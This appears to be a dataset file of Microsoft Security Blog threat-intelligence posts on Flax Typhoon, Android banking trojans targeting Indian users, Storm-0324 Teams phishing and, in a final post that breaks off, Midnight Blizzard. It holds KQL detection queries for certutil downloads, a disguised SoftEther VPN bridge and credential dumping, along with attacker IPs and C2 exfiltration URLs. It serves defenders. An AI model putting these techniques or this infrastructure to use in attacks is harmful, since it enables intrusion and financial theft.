startDate: datetime, endDate: datetime) [ \"101.33.205.106\", datetime(\"2022-11-07\"), datetime(\"2022-11-08\"), \"39.98.208.61\", datetime(\"2023-07-28\"), datetime(\"2023-08-12\"), \"45.195.149.224\", datetime(\"2023-01-04\"), datetime(\"2023-03-29\"), \"122.10.89.230\", datetime(\"2023-01-12\"), datetime(\"2023-01-13\"), \"45.204.1.248\", datetime(\"2023-02-23\"), datetime(\"2023-05-09\"), \"45.204.1.247\", datetime(\"2023-07-24\"), datetime(\"2023-08-10\"), \"45.88.192.118\", datetime(\"2022-11-07\"), datetime(\"2022-11-08\"), \"154.19.187.92\", datetime(\"2022-12-01\"), datetime(\"2022-12-02\"), \"134.122.188.20\", datetime(\"2023-06-13\"), datetime(\"2023-06-20\"), \"104.238.149.146\", datetime(\"2023-07-13\"), datetime(\"2023-07-14\"), \"139.180.158.51\", datetime(\"2022-08-30\"), datetime(\"2023-07-27\"), \"137.220.36.87\", datetime(\"2023-02-23\"), datetime(\"2023-08-04\"), \"192.253.235.107\", datetime(\"2023-06-06\"), datetime(\"2023-06-07\") ]; let RemoteIPFiltered = DeviceNetworkEvents | join kind=inner (ipAddressTimes) on $left.\nRemoteIP == $right.ip | where Timestamp between (startDate .. endDate); let LocalIPFiltered = DeviceNetworkEvents | join kind=inner (ipAddressTimes) on $left.\nLocalIP == $right.ip | where Timestamp between (startDate .. endDate); union RemoteIPFiltered, LocalIPFiltered SoftEther VPN bridge launched by SQL Server process DeviceProcessEvents | where ProcessVersionInfoOriginalFileName == \"vpnbridge.exe\" or ProcessVersionInfoFileDescription == \"SoftEther VPN\" | where InitiatingProcessParentFileName == \"sqlservr.exe\" SoftEther VPN bridge renamed to “conhost.exe” or “dllhost.exe” DeviceProcessEvents | where ProcessVersionInfoOriginalFileName == \"vpnbridge.exe\" or ProcessVersionInfoFileDescription == \"SoftEther VPN\" | where ProcessCommandLine has_any (\"conhost.exe\", \"dllhost.exe\") or FolderPath has_any (\"mssql\", \"conhost.exe\", \"dllhost.exe\") Certutil launched by SQL Server process DeviceProcessEvents | where ProcessCommandLine has_all (\"certutil\", \"-urlcache\") | where InitiatingProcessFileName has_any (\"sqlservr.exe\", \"sqlagent.exe\", \"sqlps.exe\", \"launchpad.exe\", \"sqldumper.exe\") File downloaded by MSSQLSERVER account using certutil DeviceFileEvents | where InitiatingProcessAccountName == \"MSSQLSERVER\" | where InitiatingProcessFileName == \"certutil.exe\" File renamed to “conhost.exe” or “dllhost.exe”, downloaded using certutil DeviceFileEvents | where InitiatingProcessFileName == \"certutil.exe\" | where FileName in (\"conhost.exe\", \"dllhost.exe\") Network connection made by SoftEther VPN bridge renamed to “conhost.exe” or “dllhost.exe” DeviceNetworkEvents | where InitiatingProcessVersionInfoOriginalFileName == \"vpnbridge.exe\" or InitiatingProcessVersionInfoProductName == \"SoftEther VPN\" | where InitiatingProcessFileName == \"conhost.exe\" Network connection made by MSSQLSERVER account, using SoftEther VPN bridge DeviceNetworkEvents | where InitiatingProcessVersionInfoOriginalFileName == \"vpnbridge.exe\" or InitiatingProcessVersionInfoProductName == \"SoftEther VPN\" | where InitiatingProcessAccountName == \"MSSQLSERVER\" Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\nMore details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy.\nMicrosoft Sentinel also has a range of detection and threat hunting content that customers can use to detect the post exploitation activity detailed in this blog in addition to Microsoft 365 Defender detections list above. -\nPossible web shell drop - Web shell activity - Potential local privilege escalation - Anomalous RDP activity - Accessibility features modification - Certutil-LOLBins - Bitsadmin activity - Suspected LSASS dump - Credential dumping service installation Indicators of compromise In addition to compromised SOHO devices and compromised devices used for traffic proxying, Flax Typhoon maintains actor-controlled network infrastructure, including virtual private servers (VPS).\nOver the course of the campaign, the IP addresses listed in the table below were used during the corresponding timeframes.\n| IP address | First seen | Last seen | Description | | 101.33.205[.]106 | 2022-11-07 | 2022-11-07 | Flax Typhoon network infrastructure | | 39.98.208[.]61 | 2023-07-28 | 2023-08-11 | Flax Typhoon network infrastructure | | 45.195.149[.]224 | 2023-01-04 | 2023-03-28 | Flax Typhoon network infrastructure | | 122.10.89[.]230 | 2023-01-12 | 2023-01-12 | Flax Typhoon network infrastructure | | 45.204.1[.]248 | 2023-02-23 | 2023-05-09 | Flax Typhoon network infrastructure | | 45.204.1[.]247 | 2023-07-24 | 2023-08-09 | Flax Typhoon network infrastructure | | 45.88.192[.]118 | 2022-11-07 | 2022-11-07 | Flax Typhoon network infrastructure | | 154.19.187[.]92 | 2022-12-01 | 2022-12-01 | Flax Typhoon network infrastructure | | 134.122.188[.]20 | 2023-06-13 | 2023-06-19 | Flax Typhoon network infrastructure | | 104.238.149[.]146 | 2023-07-13 | 2023-07-13 | Flax Typhoon network infrastructure | | 139.180.158[.]51 | 2022-08-30 | 2023-07-26 | Flax Typhoon network infrastructure | | 192.253.235[.]107 | 2023-06-06 | 2023-06-06 | Flax Typhoon network infrastructure | Flax Typhoon hosts its SofEther VPN servers on its own network infrastructure.\nBecause the servers use the HTTPS protocol to disguise network traffic, they must present TLS certificates.\nFlax Typhoon used the certificates listed in the table below on these VPN servers.\n| SHA-1 TLS fingerprint | Common name (CN) | | 7992c0a816246b287d991c4ecf68f2d32e4bca18 | vpn437972693.sednc[.]cn | | 5437d0195c31bf7cedc9d90b8cb0074272bc55df | asljkdqhkhasdq.softether[.]net | | cc1f0cdc131dfafd43f60ff0e6a6089cd03e92f1 | vpn472462384.softether[.]net | | 2c95b971aa47dc4d94a3c52db74a3de11d9ba658 | softether | References - https://attack.mitre.org/techniques/T1190 - https://attack.mitre.org/techniques/T1505/003/ - https://attack.mitre.org/software/S0020/ - https://github.com/ohpe/juicy-potato - https://github.com/BeichenDream/BadPotato - https://attack.mitre.org/techniques/T1059 - https://attack.mitre.org/techniques/T1546/008/ - https://attack.mitre.org/techniques/T1105/ - https://github.com/SoftEtherVPN/SoftEtherVPN_Stable - https://attack.mitre.org/techniques/T1543/003 - https://attack.mitre.org/techniques/T1036/005/ - https://github.com/SoftEtherVPN/SoftEtherVPN_Stable/blob/master/WARNING.TXT - https://attack.mitre.org/techniques/T1572/ - https://attack.mitre.org/techniques/T1003/001/ - https://attack.mitre.org/techniques/T1003/002/ - https://attack.mitre.org/techniques/T1550/002/ Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us at https://twitter.com/MsftSecIntel.","num_sentences":119,"metadata":{"source":"blog","platform":"Microsoft","filename":"flax-typhoon"}}
{"id":59,"title":"Social engineering attacks lure Indian users to install Android banking trojans | Microsoft Security Blog","publish_date":null,"link":"https://www.microsoft.com/en-us/security/blog/2023/11/20/social-engineering-attacks-lure-indian-users-to-install-android-banking-trojans/","clean_text":"Microsoft has observed ongoing activity from mobile banking trojan campaigns targeting users in India with social media messages designed to steal users’ information for financial fraud.\nUsing social media platforms like WhatsApp and Telegram, attackers are sending messages designed to lure users into installing a malicious app on their mobile device by impersonating legitimate organizations, such as banks, government services, and utilities.\nOnce installed, these fraudulent apps exfiltrate various types of sensitive information from users, which can include personal information, banking details, payment card information, account credentials, and more.\nWhile not a new threat, mobile malware infections pose a significant threat to mobile users, such as unauthorized access to personal information, financial loss due to fraudulent transactions, loss of privacy, device performance issues due to malware consuming system resources, and data theft or corruption.\nIn the past, we observed similar banking trojan campaigns sending malicious links leading users to download malicious apps, as detailed in our blog Rewards plus: Fake mobile banking rewards apps lure users to install info-stealing RAT on Android devices.\nThe current active campaigns have pivoted to sharing malicious APK files directly to mobile users located in India.\nOur investigation focused on two malicious applications that falsely present themselves as official banking apps.\nSpoofing and impersonating legitimate banks, financial institutions, and other official services is a common social engineering tactic for information-stealing malware.\nImportantly, legitimate banks themselves are not affected by these attacks directly, and the existence of these attacks is not related to legitimate banks’ own authentic mobile banking apps and security posture.\nThat said, cybercriminals often target customers of large financial institutions by masquerading as a legitimate entity.\nThis threat highlights the need for customers to install applications only from official app stores, and to be wary of false lures as we see in these instances.\nIn this blog, we shed light on the ongoing mobile banking trojan campaigns impacting various sectors by analyzing the attacks of two fraudulent apps targeting Indian banking customers.\nWe also detail some of the additional capabilities of malicious apps observed in similar campaigns and provide recommendations and detections to defend against such threats.\nAs our mobile threat research continuously monitors malware campaigns in the effort to combat attackers’ tactics, tools, and procedures (TTPs), we notified the organizations being impersonated by these fake app campaigns.\nMicrosoft is also reporting on this activity to bring increased awareness to the threat landscape as mobile banking trojans and credential phishing fraud continues to persist, prompting an urgent call for robust and proactive defense strategies.\nCase 1: Fake banking app targeting account information We discovered a recent WhatsApp phishing campaign through our telemetry that led to banking trojan activity.\nIn this campaign, the attacker shares a malicious APK file through WhatsApp with a message asking users to enter sensitive information in the app.\nThe widely circulated fake banking message states “Your [redacted] BANK Account will be Blocked Today please update your PANCARD immediately open [redacted]-Bank.apk for update your PANCARD.\nThank You.”\nand includes a APK file named [redacted]-BANK[.]apk.\nUpon investigation, we discovered that the APK file was malicious and interacting with it installs a fraudulent application on the victim device.\nThe installed app impersonates a legitimate bank located in India and disguises itself as the bank’s official Know Your Customer (KYC) application to trick users into submitting their sensitive information, despite this particular banking organization not being affiliated with an official KYC-related app.\nThis information is then sent to a command and control (C2) server, as well as to the attacker’s hard-coded phone number used in SMS functionality.\nWhat users see Upon installation, the fake app displays a bank icon posing as a legitimate bank app.\nNote that the app we analyzed is not an official bank app from the Google Play Store, but a fake app that we’ve observed being distributed through social media platforms.\nThe initial screen then proceeds to ask the user to enable SMS-based permissions.\nOnce the user allows the requested permissions, the fake app displays the message “Welcome to [redacted] Bank fast & Secure Online KYC App” and requests users to signin to internet banking by entering their mobile number, ATM pin, and PAN card details.\nAfter clicking the sign-in button, the app displays a verification prompt asking the user to enter the digits on the back of their banking debit card in grid format for authentication—a common security feature used as a form of multifactor authentication (MFA), where banks provide debit cards with 2-digit numbers in the form of a grid on the back of the card.\nOnce the user clicks the authenticate button, the app claims to verify the shared details but fails to retrieve data, instead moving on to the next screen requesting additional user information.\nThis can trick the user into believing that the process is legitimate, while remaining unaware of the malicious activity launching in the background.\nNext, the user is asked to enter their account number followed by their account credentials.\nOnce all the requested details are submitted, a suspicious note appears stating that the details are being verified to update KYC.\nThe user is instructed to wait 30 minutes and not to delete or uninstall the app.\nAdditionally, the app has the functionality to hide its icon, causing it to disappear from the user’s device home screen while still running in the background.\nTechnical analysis To start our investigation and as part of our proactive research, we located and analyzed the following sample: | SHA-256 | 6812a82edcb49131a990acd88ed5f6d73da9f536b60ee751184f27265ea769ee | | Package name | djhgsfjhfdgf[.]gjhdgsfsjde[.]myappl876786ication | We first examined the app’s AndroidManifest file, which lists the permissions and components (such as activities, services, receivers, and providers) that can run in the background without requiring user interaction.\nWe discovered that the malware requests two runtime permissions (also known as dangerous permissions) from users: | Permissions | Description | | Receive_SMS | Intercept SMSs received on the victim’s device | | Send_SMS | Allows an application to send SMS | The below image displays the requested Receive_SMS and Send_SMS permissions, the activities, receivers, and providers used in the application, and the launcher activity, which loads the application’s first screen.\nSource code review Main activity The main activity, djhgsfjhfdgf[.]gjhdgsfsjde[.]myappl876786ication[.]M1a2i3n4A5c6t7i8v9i0t0y987654321, executes once the app is launched and shows as the first screen of the application.\nThe OnCreate() method of this class requests permissions for Send_SMS and Receive_SMS and displays a form to complete the KYC application with text fields for a user’s mobile number, ATM pin, and PAN card.\nOnce the user’s details are entered successfully, the collected data is added to a JSON object and sent to the attacker’s C2 at: https://biogenetic-flake.000webhostapp[.]com/add.php The app displays a note saying “Data added successfully”.\nIf the details are not entered successfully, the form fields will be empty, and an error note will be displayed.\nAdditionally, the malware collects data and sends it to the attacker’s phone number specified in the code using SMS.\nStealing SMS messages and account information The malware collects incoming SMS messages from the victim’s device using the newly granted Receive_SMS permission.\nThese incoming messages may contain one-time passwords (OTPs) that can be used to bypass MFA and steal money from the victim’s bank account.\nUsing the Send_SMS permission, the victim’s messages are then sent to the attacker’s C2 server (https[:]//biogenetic-flake[.]000webhostapp[.]com/save_sms[.]php?phone=) and to the attacker’s hardcoded phone number via SMS.\nThe user’s bank account information is also targeted for exfiltration—once the user submits their requested account number and account credentials, the malware collects the data and similarly sends it to the attacker’s C2 server and hard-coded phone number.\nHiding app icon Finally, the app has the functionality to hide its icon from the home screen and run in the background.\nCase 2: Fake banking app targeting payment card details Similar to the first case, the second case involves a fraudulent app that deceives users into providing personal information.\nUnlike the first case, the banking trojan in the second case is capable of stealing credit card details, putting users at risk of financial fraud.\nUser information targeted by the fraudulent app to be sent to the attacker’s C2 includes: - Personal information – Name, email ID, mobile number, date of birth - Payment information – Card details (16-digit number, CVV number, card expiration date) - Incoming SMS What users see When the user interacts with the app, it displays a launch screen featuring the app icon and prompting the user to grant SMS-based permissions.\nOnce the requested permissions are enabled, the app displays a form for the user to enter their personal details, including their name, email address, mobile number, and date of birth.\nThe data provided by the user is then sent to C2 server.\nAfter this, the app displays a form for the user to enter their credit card details, including the 16-digit card number, CVV number, and card expiration date, which is also sent to the attacker’s C2.\nAdditional features in some versions In related campaigns, we observed some versions of the same malicious app include additional features and capabilities, such as capturing: - Financial information – Bank details, bank ID, card details - Personal information – PAN card, Aadhar number, permanent address, state, country, pin code, income - Verifying and stealing one-time passwords (OTPs) Similar campaigns Based on our telemetry, we have been observing similar campaigns using the names of legitimate organizations in the banking, government services, and utilities sectors, as app file names to target Indian mobile users.\nLike the two cases discussed above, these campaigns involve sharing the fraudulent apps through WhatsApp and Telegram, and possibly other social media platforms.\nMoreover, these campaigns select legitimate and even well-known institutions and services in the region to imitate and lure users into a false sense of security.\nSpoofing and impersonating legitimate organizations and official services is a common social engineering tactic for information-stealing malware.\nWhile these banks and other organizations themselves are not affected by the attack directly, attackers often target customers by imitating legitimate entities.\nConclusion Mobile banking trojan infections can pose significant risks to users’ personal information, privacy, device integrity, and financial security.\nAs the campaigns discussed in this blog display, these threats can often disguise themselves as legitimate apps and deploy social engineering tactics to achieve their goals and steal users’ sensitive data and financial assets.\nBeing aware of the risks and common tactics used by banking trojans and other mobile malware can help users identify signs of infection and take appropriate action to mitigate the impacts of these threats.\nFinding unfamiliar installed apps, increased data usage or battery drain, unauthorized transactions or account settings changes, device crashes, slow performance, unexpected pop-ups, and other unusual app behaviors can indicate a possible banking trojan infection.\nTo help prevent such threats, we recommend the following precautionary measures: - Only install apps from trusted sources and official stores, like the Google Play Store and Apple App Store. -\nNever click on unknown links received through ads, SMS messages, emails, or similar untrusted sources. -\nUse mobile solutions such as Microsoft Defender for Endpoint on Android to detect malicious applications - Always keep Install unknown apps disabled on the Android device to prevent apps from being installed from unknown sources.\nAdditionally, various Indian banks, governments services, and other organizations are conducting security awareness campaigns on social media using promotional videos to educate users and help combat the ongoing threat presented by these mobile banking trojan campaigns.\nAbhishek Pustakala, Harshita Tripathi, and Shivang Desai Microsoft Threat Intelligence Appendix Microsoft 365 Defender detections Microsoft Defender Antivirus and Microsoft Defender for Endpoint on Android detect these threats as the following malware: - Trojan:AndroidOS/Banker.\nU - Trojan:AndroidOS/RewardSteal.\nS - Trojan:AndroidOS/RewardSteal.\nI - TrojanSpy:AndroidOS/SpyBanker.\nY Indicators of compromise | SHA256 | Description | Threat Name | | 6812a82edcb49131a990acd88ed5f6d73da9f536b60ee751184f27265ea769ee | Malicious APK | Trojan:AndroidOS/Banker.\nU | | 34cdc6ef199b4c50ee80eb0efce13a63a9a0e6bee9c23610456e913bf78272a8 | Malicious APK | TrojanSpy:AndroidOS/SpyBanker.\nY | MITRE ATT&CK techniques | Execution | Defense Evasion | Credential Access | Collection | Exfiltration | Impact | | Scheduled Task/Job | Obfuscated Files/Information | Input Capture | Protected User Data: SMS Messages | Exfiltration Over C2 Channel | SMS Control | | Hide Artifacts: Suppress Application Icon | References Acknowledgments Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on X (formerly)Twitter at https://twitter.com/MsftSecIntel.","num_sentences":73,"metadata":{"source":"blog","platform":"Microsoft","filename":"lure-indian-users"}}
{"id":60,"title":"Malware distributor Storm-0324 facilitates ransomware access | Microsoft Security Blog","publish_date":"2023-07-28","link":"https://www.microsoft.com/en-us/security/blog/2023/09/12/malware-distributor-storm-0324-facilitates-ransomware-access/","clean_text":"The threat actor that Microsoft tracks as Storm-0324 is a financially motivated group known to gain initial access using email-based initial infection vectors and then hand off access to compromised networks to other threat actors.\nThese handoffs frequently lead to ransomware deployment.\nBeginning in July 2023, Storm-0324 was observed distributing payloads using an open-source tool to send phishing lures through Microsoft Teams chats.\nThis activity is not related to the Midnight Blizzard social engineering campaigns over Teams that we observed beginning in May 2023.\nBecause Storm-0324 hands off access to other threat actors, identifying and remediating Storm-0324 activity can prevent more dangerous follow-on attacks like ransomware.\nStorm-0324 (DEV-0324), which overlaps with threat groups tracked by other researchers as TA543 and Sagrid, acts as a distributor in the cybercriminal economy, providing a service to distribute the payloads of other attackers through phishing and exploit kit vectors.\nStorm-0324’s tactics focus on highly evasive infection chains with payment and invoice lures.\nThe actor is known to distribute the JSSLoader malware, which facilitates access for the ransomware-as-a-service (RaaS) actor Sangria Tempest (ELBRUS, Carbon Spider, FIN7).\nPrevious distribution activity associated with Storm-0324 included the Gozi infostealer and the Nymaim downloader and locker.\nIn this blog, we provide a comprehensive analysis of Storm-0324 activity, covering their established tools, tactics, and procedures (TTPs) as observed in past campaigns as well as their more recent attacks.\nTo defend against this threat actor, Microsoft customers can use Microsoft 365 Defender to detect Storm-0324 activity and significantly limit the impact of these attacks on networks.\nAdditionally, by using the principle of least privilege, building credential hygiene, and following the other recommendations we provide in this blog, administrators can limit the destructive impact of ransomware even if the attackers can gain initial access.\nHistorical malware distribution activity Storm-0324 manages a malware distribution chain and has used exploit kit and email-based vectors to deliver malware payloads.\nThe actor’s email chains are highly evasive, making use of traffic distribution systems (TDS) like BlackTDS and Keitaro, which provide identification and filtering capabilities to tailor user traffic.\nThis filtering capability allows attackers to evade detection by certain IP ranges that might be security solutions, like malware sandboxes, while also successfully redirecting victims to their malicious download site.\nStorm-0324’s email themes typically reference invoices and payments, mimicking services such as DocuSign, Quickbooks, and others.\nUsers are ultimately redirected to a SharePoint-hosted compressed file containing JavaScript that downloads the malicious DLL payload.\nStorm-0324 has used many file formats to launch the malicious JavaScript including Microsoft Office documents, Windows Script File (WSF), and VBScript, among others.\nStorm-0324 has distributed a range of first-stage payloads since at least 2016, including: - Nymaim, a first-stage downloader and locker - Gozi version 3, an infostealer - Trickbot, a modular malware platform - Gootkit, a banking trojan - Dridex, a banking trojan - Sage ransomware - GandCrab ransomware - IcedID, a modular information-stealing malware Since 2019, however, Storm-0324 has primarily distributed JSSLoader, handing off access to ransomware actor Sangria Tempest.\nOngoing Storm-0324 and Sangria Tempest JSSLoader email-based infection chain Since as early as 2019, Storm-0324 has handed off access to the cybercrime group Sangria Tempest after delivering the group’s first-stage malware payload, JSSLoader.\nStorm-0324’s delivery chain begins with phishing emails referencing invoices or payments and containing a link to a SharePoint site that hosts a ZIP archive.\nMicrosoft continues to work across its platforms to identify abuse, take down malicious activity, and implement new proactive protections to discourage malicious actors from using our services.\nThe ZIP archive contains a file with embedded JavaScript code.\nStorm-0324 has used a variety of files to host the JavaScript code, including WSF and Ekipa publisher files exploiting the CVE-2023-21715 local security feature bypass vulnerability.\nWhen the JavaScript launches, it drops a JSSLoader variant DLL.\nThe JSSLoader malware is then followed by additional Sangria Tempest tooling.\nIn some cases, Storm-0324 uses protected documents for additional social engineering.\nBy adding the security code or password in the initial communications to the user, the lure document may acquire an additional level of believability for the user.\nThe password also serves as an effective anti-analysis measure because it requires user interaction after launch.\nNew Teams-based phishing activity In July 2023, Storm-0324 began using phishing lures sent over Teams with malicious links leading to a malicious SharePoint-hosted file.\nFor this activity, Storm-0324 most likely relies on a publicly available tool called TeamsPhisher.\nTeamsPhisher is a Python-language program that enables Teams tenant users to attach files to messages sent to external tenants, which can be abused by attackers to deliver phishing attachments.\nThese Teams-based phishing lures by threat actors are identified by the Teams platform as “EXTERNAL” users if external access is enabled in the organization.\nMicrosoft takes these phishing campaigns very seriously and has rolled out several improvements to better defend against these threats.\nIn accordance with Microsoft policies, we have suspended identified accounts and tenants associated with inauthentic or fraudulent behavior.\nWe have also rolled out enhancements to the Accept/Block experience in one-on-one chats within Teams, to emphasize the externality of a user and their email address so Teams users can better exercise caution by not interacting with unknown or malicious senders .\nWe rolled out new restrictions on the creation of domains within tenants and improved notifications to tenant admins when new domains are created within their tenant.\nIn addition to these specific enhancements, our development teams will continue to introduce additional preventative and detective measures to further protect customers from phishing attacks.\nRecommendations To harden networks against Storm-0324 attacks, defenders are advised to implement the following: - Pilot and start deploying phishing-resistant authentication methods for users. -\nImplement Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps. -\nApply security best practices for Microsoft Teams.\nRefer to the security guide for Microsoft Teams. -\nUnderstand and select the best access settings for external collaboration for your organization. -\nSpecify trusted Microsoft 365 organizations to define which external domains are allowed or blocked to chat and meet. -\nKeep Microsoft 365 auditing enabled so that audit records could be investigated if required. -\nAllow only known devices that adhere to Microsoft’s recommended security baselines. -\nEducate users about social engineering and credential phishing attacks, including refraining from entering MFA codes sent via any form of unsolicited messages. -\nEducate Microsoft Teams users to verify ‘External’ tagging on communication attempts from external entities, be cautious about what they share, and never share their account information or authorize sign-in requests over chat. -\nEducate Microsoft Teams users about accepting or blocking people outside the organization who send messages in Microsoft Teams. -\nEducate users to review sign-in activity and mark suspicious sign-in attempts as “This wasn’t me”. -\nImplement Conditional Access App Control in Microsoft Defender for Cloud Apps for users connecting from unmanaged devices. -\nConfigure Microsoft Defender for Office 365 to recheck links on click.\nSafe Links provides URL scanning and rewriting of inbound email messages in mail flow, and time-of-click verification of URLs and links in email messages, other Microsoft Office applications such as Teams, and other locations such as SharePoint Online.\nSafe Links scanning occurs in addition to the regular anti-spam and anti-malware protection in inbound email messages in Microsoft Exchange Online Protection (EOP).\nSafe Links scanning can help protect your organization from malicious links that are used in phishing and other attacks. -\nEnable Zero-hour auto purge (ZAP) in Microsoft Office 365 to quarantine sent mail in response to newly acquired threat intelligence and retroactively neutralize malicious phishing, spam, or malware messages that have already been delivered to mailboxes. -\nPractice the principle of least privilege and maintain credential hygiene.\nAvoid the use of domain-wide, administrator-level service accounts.\nRestricting local administrative privileges can help limit installation of RATs and other unwanted applications. -\nTurn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus.\nThese capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. -\nFor additional recommendations on hardening your organization against ransomware attacks, refer to our threat overview on human-operated ransomware.\nMicrosoft customers can turn on attack surface reduction rules to prevent common attack techniques: - Block executable files from running unless they meet a prevalence, age, or trusted list criterion - Block JavaScript or VBScript from launching downloaded executable content - Use advanced protection against ransomware Detection details Microsoft 365 Defender Microsoft 365 Defender is becoming Microsoft Defender XDR.\nLearn more.\nMicrosoft Defender Antivirus Microsoft Defender Antivirus detects threat components as the following malware: - TrojanSpy:MSIL/JSSLoader - Trojan:Win32/Gootkit - Trojan:Win32/IcedId - Trojan:Win64/IcedId - Trojan:Win32/Trickbot Microsoft Defender for Endpoint Alerts with the following titles in the security center can indicate threat activity on your network: - Ransomware-linked Storm-0324 threat activity group detected Hunting queries Microsoft 365 Defender Possible TeamsPhisher downloads The following query looks for downloaded files that were potentially facilitated by use of the TeamsPhisher tool.\nDefenders should customize the SharePoint domain name (‘mysharepointname’) in the query.\nlet allowedSharepointDomain = pack_array( 'mysharepointname' //customize Sharepoint domain name and add more domains as needed for your query ); // let executable = pack_array( 'exe', 'dll', 'xll', 'msi', 'application' ); let script = pack_array( 'ps1', 'py', 'vbs', 'bat' ); let compressed = pack_array( 'rar', '7z', 'zip', 'tar', 'gz' ); // let startTime = ago(1d); let endTime = now(); DeviceFileEvents | where Timestamp between (startTime..endTime) | where ActionType =~ 'FileCreated' | where InitiatingProcessFileName has 'teams.exe' or InitiatingProcessParentFileName has 'teams.exe' | where InitiatingProcessFileName !\nhas 'update.exe' and InitiatingProcessParentFileName !\nhas 'update.exe' | where FileOriginUrl has 'sharepoint' and FileOriginReferrerUrl has_any ('sharepoint', 'teams.microsoft') | extend fileExt = tolower(tostring(split(FileName,'.\n')[-1])) | where fileExt in (executable) or fileExt in (script) or fileExt in (compressed) | extend fileGroup = iff( fileExt in (executable),'executable','') | extend fileGroup = iff( fileExt in (script),'script',fileGroup) | extend fileGroup = iff( fileExt in (compressed),'compressed',fileGroup) // | extend sharePoint_domain = tostring(split(FileOriginUrl,'/')[2]) | where not (sharePoint_domain has_any (allowedSharepointDomain)) | project-reorder Timestamp, DeviceId, DeviceName, sharePoint_domain, FileName, FolderPath, SHA256, FileOriginUrl, FileOriginReferrerUrl Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\nMore details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy.\nMicrosoft Sentinel also has a range of detection and threat hunting content that customers can use to detect the post exploitation activity detailed in this blog in addition to Microsoft 365 Defender detections list above. -\nSuspicious Javascript - Javascript file creation - Ransomware Triggered - Signs of Ransomware Activity - Suspicious Image Load References - Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself - JSSLoader: Recoded and Reloaded (Proofpoint) Further reading Microsoft customers can refer to the report on this activity in Microsoft Defender Threat Intelligence and Microsoft 365 Defender for detections, assessment of impact, mitigation and recovery actions, and hunting guidance.\nFor the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on Twitter at https://twitter.com/MsftSecIntel.","num_sentences":76,"metadata":{"source":"blog","platform":"Microsoft","filename":"malware-distributor"}}
{"id":61,"title":"Midnight Blizzard conducts targeted social engineering over Microsoft Teams | Microsoft Security Blog","publish_date":"2023-05-28","link":"https://www.microsoft.com/en-us/security/blog/2023/08/02/midnight-blizzard-conducts-targeted-social-engineering-over-microsoft-teams/","clean_text":"Microsoft Threat Intelligence has identified highly targeted social engineering attacks using credential theft phishing lures sent as Microsoft Teams chats by the threat actor that Microsoft tracks as Midnight Blizzard (previously tracked as NOBELIUM).\nThis latest attack, combined with past activity, further demonstrates Midnight Blizzard’s ongoing execution of their objectives using both new and common techniques.\nIn this latest activity, the threat actor uses previously compromised Microsoft 365 tenants owned by small businesses to create new domains that appear as technical support entities.\nUsing these domains from compromised tenants, Midnight Blizzard leverages Teams messages to send lures that attempt to steal credentials from a targeted organization by engaging a user and eliciting approval of multifactor authentication (MFA) prompts.\nAs with any social engineering lures, we encourage organizations to reinforce security best practices to all users and reinforce that any authentication requests not initiated by the user should be treated as malicious.\nOur current investigation indicates this campaign has affected fewer than 40 unique global organizations.\nThe organizations targeted in this activity likely indicate specific espionage objectives by Midnight Blizzard directed at government, non-government organizations (NGOs), IT services, technology, discrete manufacturing, and media sectors.\nMicrosoft has mitigated the actor from using the domains and continues to investigate this activity and work to remediate the impact of the attack.\nAs with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments.\nMidnight Blizzard (NOBELIUM) is a Russia-based threat actor attributed by the US and UK governments as the Foreign Intelligence Service of the Russian Federation, also known as the SVR.\nThis threat actor is known to primarily target governments, diplomatic entities, non-government organizations (NGOs), and IT service providers primarily in the US and Europe.\nTheir focus is to collect intelligence through longstanding and dedicated espionage of foreign interests that can be traced to early 2018.\nTheir operations often involve compromise of valid accounts and, in some highly targeted cases, advanced techniques to compromise authentication mechanisms within an organization to expand access and evade detection.\nMidnight Blizzard is consistent and persistent in their operational targeting, and their objectives rarely change.\nThey utilize diverse initial access methods ranging from stolen credentials to supply chain attacks, exploitation of on-premises environments to laterally move to the cloud, exploitation of service providers’ trust chain to gain access to downstream customers, as well as the Active Directory Federation Service (AD FS) malware known as FOGGYWEB and MAGICWEB.\nMidnight Blizzard (NOBELIUM) is tracked by partner security vendors as APT29, UNC2452, and Cozy Bear.\nMidnight Blizzard’s latest credential phishing attack Midnight Blizzard regularly utilizes token theft techniques for initial access into targeted environments, in addition to authentication spear-phishing, password spray, brute force, and other credential attacks.\nThe attack pattern observed in malicious activity since at least late May 2023 has been identified as a subset of broader credential attack campaigns that we attribute to Midnight Blizzard.\nUse of security-themed domain names in lures To facilitate their attack, the actor uses Microsoft 365 tenants owned by small businesses they have compromised in previous attacks to host and launch their social engineering attack.\nThe actor renames the compromised tenant, adds a new onmicrosoft.com subdomain, then adds a new user associated with that domain from which to send the outbound message to the target tenant.\nThe actor uses security-themed or product name-themed keywords to create a new subdomain and new tenant name to lend legitimacy to the messages.\nThese precursory attacks to compromise legitimate Azure tenants and the use of homoglyph domain names in social engineering lures are part of our ongoing investigation.\nMicrosoft has mitigated the actor from using the domains.\nSocial engineering attack chain In this activity, Midnight Blizzard either has obtained valid account credentials for the users they are targeting, or they are targeting users with passwordless authentication configured on their account – both of which require the user to enter a code that is displayed during the authentication flow into the prompt on the Microsoft Authenticator app on their mobile device.\nAfter attempting to authenticate to an account where this form of MFA is 